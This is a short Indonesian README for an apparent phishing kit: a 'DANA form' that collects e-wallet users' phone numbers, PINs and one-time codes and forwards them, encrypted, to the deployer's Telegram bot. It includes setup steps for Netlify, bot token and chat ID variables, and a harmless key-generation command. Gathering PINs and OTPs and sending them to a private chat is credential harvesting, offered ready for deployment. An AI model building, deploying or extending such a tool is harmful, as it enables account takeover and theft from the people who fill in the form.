# Form DANA dengan Enkripsi Telegram

Proyek ini adalah form DANA yang mengirim data terenkripsi ke bot Telegram.

## Fitur

- Form input nomor telepon, PIN, dan OTP
- Enkripsi AES-256-GCM untuk data sensitif
- Pengiriman notifikasi aman ke Telegram
- Tampilan responsif untuk mobile

## Cara Install

1. Clone repository ini
2. Install dependencies: `npm install`
3. Deploy ke Netlify

## Environment Variables

Di Netlify, atur environment variables berikut:

- `TELEGRAM_BOT_TOKEN`: Token bot Telegram dari @BotFather
- `TELEGRAM_CHAT_ID`: ID chat Telegram (dapat dari @userinfobot)
- `ENCRYPTION_KEY`: Kunci enkripsi 64 karakter (hex)

## Cara Generate Encryption Key

Jalankan perintah berikut untuk generate encryption key:

```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))".
